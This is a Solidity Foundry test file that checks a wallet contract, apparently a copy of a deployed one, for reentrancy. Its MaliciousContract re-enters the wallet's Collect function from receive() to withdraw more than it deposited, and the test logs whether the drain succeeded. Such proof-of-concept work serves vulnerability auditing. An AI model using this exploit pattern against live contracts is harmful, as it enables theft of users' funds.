// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol";

contract MockLog is Log {
    // Empty mock implementation since we don't need actual logging for this test
}

contract MaliciousContract {
    W_WALLET public wallet;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _walletAddress) payable {
        wallet = W_WALLET(_walletAddress);
    }

    function deposit(uint _unlockTime) external payable {
        wallet.Put{value: msg.value}(_unlockTime);
    }

    function attack(uint _amount) external {
        attackAmount = _amount;
        wallet.Collect(_amount);
    }

    receive() external payable {
        if (attackCount < 1 && address(wallet).balance >= attackAmount) {
            attackCount++;
            wallet.Collect(attackAmount);
        }
    }
}

contract W_WALLETTest is Test {
    W_WALLET public wallet;
    MockLog public mockLog;
    MaliciousContract public attacker;
    uint constant DEPOSIT_AMOUNT = 2 ether;
    uint constant ATTACK_AMOUNT = 1 ether;

    function setUp() public {
        // Deploy mock Log contract
        mockLog = new MockLog();
        
        // Deploy wallet contract
        wallet = new W_WALLET(address(mockLog));
        
        // Deploy malicious contract with some ETH
        attacker = new MaliciousContract{value: DEPOSIT_AMOUNT}(payable(address(wallet)));
    }

    function testReentrancyAttack() public {
        // Deposit funds to wallet through malicious contract
        uint unlockTime = block.timestamp + 1 days;
        attacker.deposit{value: DEPOSIT_AMOUNT}(unlockTime);

        // Fast forward time to pass unlock period
        vm.warp(block.timestamp + 2 days);
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint initialWalletBalance = address(wallet).balance;
        uint initialAttackerBalance = address(attacker).balance;
        console.log("Wallet balance: %d", initialWalletBalance);
        console.log("Attacker balance: %d", initialAttackerBalance);
        
        console.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack(ATTACK_AMOUNT);

        console.log("--- AFTER-Trigger Attack ---");
        uint finalWalletBalance = address(wallet).balance;
        uint finalAttackerBalance = address(attacker).balance;
        console.log("Wallet balance: %d", finalWalletBalance);
        console.log("Attacker balance: %d", finalAttackerBalance);
        
        // Check for abnormal balance changes indicating reentrancy
        bool attackSuccess = (finalAttackerBalance > initialAttackerBalance + ATTACK_AMOUNT) && 
                             (finalWalletBalance < initialWalletBalance - ATTACK_AMOUNT);
        
        // Print final verdict
        if (attackSuccess) {
            console.log("Vulnerability Exists: Abnormal balance changes show reentrancy was exploited");
        } else {
            console.log("Vulnerability not Exist: No abnormal balance changes detected");
        }
    }
}